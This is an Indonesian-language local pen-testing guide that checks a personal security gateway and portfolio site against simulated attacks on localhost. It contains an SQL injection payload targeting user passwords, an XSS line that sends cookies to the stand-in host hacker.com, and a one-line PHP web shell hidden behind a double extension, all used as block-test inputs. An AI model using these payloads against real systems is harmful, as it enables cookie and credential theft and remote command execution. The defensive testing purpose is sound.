# 🧪 NEXUS CYBER SECURITY MESH: LOCAL PEN-TESTING & VERIFICATION SUITE
**Version:** v14.0 (Enterprise Resilience Spec)  
**Standard Compliance:** ISO 27001 (A.12.6 Technical Vulnerability Management) & ISO 25010 (Security & Fault Tolerance)  
**Target Environment:** Local ASUS TUF/Linux Lab (Docker Bridge + Native Run)

Dokumen ini adalah panduan praktis komprehensif untuk menguji ketahanan sistem **Nexus Cyber Gateway** dan **Portfolio Website** secara mandiri di komputer lokal. Semua pengujian dirancang untuk mensimulasikan taktik serangan siber nyata yang diluncurkan oleh peretas tingkat lanjut.

---

## 🛠️ PANDUAN PERSIAPAN INGRESS UJI COBA

Sebelum meluncurkan simulasi eksploitasi, pastikan seluruh layanan pertahanan aktif di latar belakang:

1. **Jalankan Web Portofolio (Target Proteksi):**
   ```bash
   cd Portfolio-website
   npm run dev
   ```
   *Layanan akan menyala secara lokal pada port default (misal: `http://localhost:5173`).*

2. **Jalankan AI Security Gateway (Gerbang Pelindung):**
   ```bash
   cd nexus-core-gateway
   go run cmd/gateway/main.go
   ```
   *Gateway akan aktif di port `:8080` dan Honeypot di port `:9090`.*

---

## 📂 DAFTAR UJI KETAHANAN SISTEM (PEN-TEST SUITE)

```
┌────────────────────────────────────────────────────────┐
│               NEXUS CYBER TEST ROADMAP                 │
├────────────────────────────────────────────────────────┤
│  [SUITE 1] Reflex & AI Gateway (SQLi & XSS Mitigation) │
│  [SUITE 2] AVSE Image Sanitizer (File Exploits)        │
│  [SUITE 3] MTD Honeypot & Tarpit Stalling             │
│  [SUITE 4] Vault Brute-Force & Postgres Logging        │
│  [SUITE 5] Client-Side Anti-Inspect Hardening          │
└────────────────────────────────────────────────────────┘
```

---

### 🛡️ [SUITE 1] REFLEX & AI GATEWAY SEMANTIC MITIGATION
Suite ini menguji keandalan Gateway dalam menyaring serangan injeksi karakter berbahaya pada parameter input URL sebelum data tersebut diteruskan ke server backend.

#### 🧪 Uji Kasus 1.1: Standard Routing (Clean Traffic Flow)
* **Tujuan**: Memastikan lalu lintas normal tidak terhambat (*Zero False-Positives*).
* **Perintah Simulasi**:
  ```bash
  curl -i http://localhost:8080/
  ```
* **Hasil yang Diharapkan**:
  * Status respons: **`200 OK`**.
  * Halaman HTML portofolio terunggah dengan sempurna tanpa interupsi.
* **Analisis Arsitektural (Why)**: Gateway harus meloloskan paket bersih dengan latensi minimal (<1ms) demi kepatuhan terhadap standar ISO 25010 (Efisiensi Kinerja).

#### 🧪 Uji Kasus 1.2: SQL Injection Attack Block
* **Tujuan**: Mencegah penyerang mengeksploitasi celah SQL di parameter URL backend.
* **Perintah Simulasi (Payload SQLi)**:
  ```bash
  curl -i "http://localhost:8080/search?q='UNION+SELECT+null,username,password+FROM+users--"
  ```
* **Hasil yang Diharapkan**:
  * Status respons: **`403 Forbidden`**.
  * Badan respons berisi pesan ancaman diblokir oleh AI Reflex Engine.
  * Log Gateway mencetak peringatan: `[REFLEX-FILTER] Blocked suspicious SQL Injection signature from IP 127.0.0.1`.

#### 🧪 Uji Kasus 1.3: Cross-Site Scripting (XSS) Attack Block
* **Tujuan**: Mencegah peretas menyuntikkan skrip JavaScript berbahaya ke browser pengguna lain.
* **Perintah Simulasi (Payload XSS)**:
  ```bash
  curl -i "http://localhost:8080/comment?text=<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>"
  ```
* **Hasil yang Diharapkan**:
  * Status respons: **`403 Forbidden`**.
  * Log Terminal AI Gateway mencatat adanya deteksi ancaman XSS tingkat tinggi (`Severity 4`).

---

### 🖼️ [SUITE 2] AVSE IMAGE SANITIZER (FILE EXPLOIT MITIGATION)
Suite ini memverifikasi keandalan modul AVSE dalam menangani berkas manipulatif yang diunggah melalui panel "Tambahkan Foto Kalian".

#### 🧪 Uji Kasus 2.1: Valid Image Processing & EXIF Sanitization
* **Tujuan**: Menguji proses sanitasi gambar bersih dan pembersihan metadata lokasi.
* **Perintah Simulasi**:
  1. Siapkan satu foto normal asli kamera (JPEG/PNG) yang memiliki data lokasi GPS/EXIF.
  2. Unggah file tersebut melalui antarmuka web di panel terbawah.
* **Hasil yang Diharapkan**:
  * Berkas berhasil terunggah dan dipajang di galeri.
  * File yang tersimpan di server **tidak lagi memiliki metadata GPS/kamera** karena telah dicuci bersih oleh AVSE, menjaga privasi pengunggah secara absolut.

#### 🧪 Uji Kasus 2.2: Malicious Double Extension Bypass (`shell.php.png`)
* **Tujuan**: Mencegah hacker menyelundupkan berkas skrip Web Shell dengan mengubah nama ekstensinya secara manipulatif.
* **Perintah Simulasi**:
  1. Buat berkas PHP penyerang palsu:
     ```bash
     echo "<?php system(\$_GET['cmd']); ?>" > shell.php.png
     ```
  2. Unggah berkas tersebut langsung ke API Gateway:
     ```bash
     curl -i -X POST -F "image=@shell.php.png" http://localhost:8080/api/upload
     ```
* **Hasil yang Diharapkan**:
  * Status respons: **`403 Forbidden`**.
  * Badan respons: `{"status":"error","message":"Security Violation: Malicious file signature detected."}`
  * Berkas ditolak secara mutlak sebelum sempat ditulis ke penyimpanan server.

#### 🧪 Uji Kasus 2.3: Steganographic Payload Sanitization
* **Tujuan**: Menetralkan file gambar asli yang disisipi kode exploit tersembunyi di dalam byte pikselnya (steganografi).
* **Perintah Simulasi**:
  1. Buat gambar yang disisipi kode berbahaya di akhir byte biner:
     ```bash
     echo "SYSTEM_HACKED_PAYLOAD" >> gambar_normal.png
     ```
  2. Kirim gambar tersebut ke Gateway:
     ```bash
     curl -i -X POST -F "image=@gambar_normal.png" http://localhost:8080/api/upload
     ```
* **Hasil yang Diharapkan**:
  * Berkas tetap diterima namun **didekode lalu di-encode ulang menjadi biner piksel mentah yang baru**.
  * String `"SYSTEM_HACKED_PAYLOAD"` yang tertempel di ekor file hilang sepenuhnya secara biner di sisi server, membuat exploit tersebut lumpuh total.

---

### 🕸️ [SUITE 3] MTD HONEYPOT & ATTACKER TARPIT STALLING
Suite ini menguji pertahanan dinamis Moving Target Defense (MTD) untuk memperlambat scanner otomatis peretas.

#### 🧪 Uji Kasus 3.1: Admin Panel Redirection & Tarpit Delayed Stalling (8s Delay)
* **Tujuan**: Menguji perlambatan bot pemindai otomatis hacker.
* **Perintah Simulasi**:
  ```bash
  curl -i "http://localhost:8080/admin"
  ```
* **Hasil yang Diharapkan**:
  * Perintah terminal **akan tertahan (loading) selama 5-10 detik** (efek Tarpit).
  * Setelah delay, respons yang diterima memiliki status **`403 Forbidden`** dengan isi payload JSON ejekan kustom:
    ```json
    {
      "status": "banned",
      "message": "AOWKAOWKOAKWOA SALAH COBA LAGI ANDA SEKARANG BERADA DI DALAM HONEYPOT",
      "server_time": "2026-05-18T...",
      "request_id": "..."
    }
    ```

#### 🧪 Uji Kasus 3.2: Direct Honeypot Ingress Verification
* **Tujuan**: Memastikan port Honeypot (`:9090`) terisolasi mandiri.
* **Perintah Simulasi**:
  ```bash
  curl -i http://localhost:9090/halaman-asal-asalan
  ```
* **Hasil yang Diharapkan**:
  * Sambungan langsung merespons dengan tarpit delay yang sama dan menampilkan pesan ejekan yang sama.

#### 🧪 Uji Kasus 3.3: Live Dashboard Telemetry Integration Check
* **Tujuan**: Memastikan aktivitas peretas yang terjebak di Honeypot disiarkan secara real-time ke SOC Dashboard.
* **Tindakan**:
  1. Lakukan serangan pemicu Honeypot seperti pada Kasus 3.1.
  2. Periksa konsol logs pada Terminal Gateway.
* **Hasil yang Diharapkan**:
  * Terminal Gateway secara instan memuntahkan log telemetri AI:  
    `[AI-COGNITION] | Layer: Honeypot-Trap | Status: ATTACKER_TRAPPED | [TRAPPED] Attacker from 127.0.0.1 caught in Honeypot on path /admin`

---

### 🔑 [SUITE 4] VAULT REWARD SECURITY & BRUTE-FORCE LOGGING
Suite ini memverifikasi integrasi database PostgreSQL dalam mencatat dan menindak upaya tebakan sandi pada vault hadiah portofolio.

#### 🧪 Uji Kasus 4.1: Correct Password Reward Reveal
* **Tujuan**: Memastikan pengguna sah dapat membuka hadiah secara normal.
* **Perintah Simulasi**:
  ```bash
  curl -i -X POST -H "Content-Type: application/json" -d '{"password":"thoriq-cyber-gate-ahihihi-berhasil"}' http://localhost:8080/api/unlock-reward
  ```
* **Hasil yang Diharapkan**:
  * Status respons: **`200 OK`**.
  * Badan respons mengembalikan tautan hadiah rahasia:
    ```json
    {
      "status": "success",
      "link": "https://shopee.co.id/m/shopee-kaget-nexus-success"
    }
    ```

#### 🧪 Uji Kasus 4.2: Unauthorized Vault Access & Attempt Counter
* **Tujuan**: Menguji respons sistem dan pembatasan saat hacker salah menebak password.
* **Perintah Simulasi**:
  ```bash
  curl -i -X POST -H "Content-Type: application/json" -d '{"password":"tebakan-asal-hacker"}' http://localhost:8080/api/unlock-reward
  ```
* **Hasil yang Diharapkan**:
  * Status respons: **`401 Unauthorized`**.
  * Badan respons: `{"status":"error","message":"Incorrect Password. Attempt 1 of 5"}`.

#### 🧪 Uji Kasus 4.3: Persistent Blacklist Logging (Postgres Integration)
* **Tujuan**: Memverifikasi pencatatan forensik serangan ke database relasional.
* **Tindakan**:
  1. Jalankan pengujian pada Kasus 4.2.
  2. Buka database PostgreSQL Anda (`nexus_cyber`) dan periksa isi tabel `threat_logs`.
* **Hasil yang Diharapkan**:
  * Muncul baris data baru dengan rincian:
    * `threat_type`: `REWARD_PASSWORD_BRUTE_FORCE`
    * `payload_sample`: Menyimpan teks `'tebakan-asal-hacker'` beserta nomor percobaan gagalnya.
    * `source_ip`: IP komputer penguji (`127.0.0.1` atau `::1`).

---

### 🖥️ [SUITE 5] CLIENT-SIDE ANTI-INSPECT HARDENING (UX & SHELL RESISTANCE)
Suite ini memvalidasi efektivitas tameng sisi klien pada browser untuk menghentikan taktik inspeksi kode manual (*Black-box defense*).

#### 🧪 Uji Kasus 5.1: Context Menu Interception (Right Click block)
* **Tujuan**: Menggagalkan pemanggilan menu "Inspect" browser lewat klik kanan.
* **Tindakan**:
  1. Buka `http://localhost:5173` pada browser (Chrome/Edge/Firefox).
  2. Lakukan klik kanan pada teks, gambar, atau area kosong mana saja di halaman web.
* **Hasil yang Diharapkan**:
  * Tidak ada menu konteks yang muncul. Klik kanan teredam secara absolut.

#### 🧪 Uji Kasus 5.2: Keyboard Short-cut Hooks Interception
* **Tujuan**: Menghentikan akses panel Developer Tools lewat jalan pintas keyboard.
* **Tindakan**:
  1. Buka halaman portofolio di browser.
  2. Coba tekan tombol keyboard berikut satu per satu:
     * `F12`
     * `Ctrl + Shift + I`
     * `Ctrl + Shift + J`
     * `Ctrl + Shift + C`
     * `Ctrl + U`
* **Hasil yang Diharapkan**:
  * Halaman tidak bereaksi, tidak memunculkan panel DevTools, dan tidak mengalihkan halaman ke kode sumber mentah HTML (*View Source* terblokir).

#### 🧪 Uji Kasus 5.3: DevTools Debugger Infinite Loop Tarpit
* **Tujuan**: Membekukan tab penjelajah hacker jika mereka memaksa membuka DevTools melalui menu aplikasi browser.
* **Tindakan**:
  1. Buka browser dan buka halaman portofolio Anda.
  2. Klik ikon menu tiga titik di pojok kanan atas browser -> **More Tools** -> **Developer Tools** (atau *Inspect*).
* **Hasil yang Diharapkan**:
  * Tab browser penjelajah akan langsung terhenti eksekusinya (*paused on breakpoint*).
  * DevTools Anda akan terjebak dalam *infinite debugger loop* yang berulang-ulang, membuat tab tersebut tidak dapat digunakan untuk memetakan DOM, memodifikasi variabel JS, atau membaca jaringan API, secara efektif mengunci hacker dari analisis sistem.

---

> [!IMPORTANT]
> **Catatan Protokol Keamanan Lokal:**  
> Untuk mencegah Anda tidak sengaja mengunci IP lokal Anda sendiri selama proses pengujian di komputer rumah, fungsionalitas **Autoban IP** (pemblokiran permanen setelah 5 kali salah password) sengaja dinonaktifkan dalam bentuk komentar (*commented-out*) pada berkas Go. Anda dapat melakukan pengujian brute-force berulang kali tanpa takut terisolasi dari basis data lokal Anda sendiri.
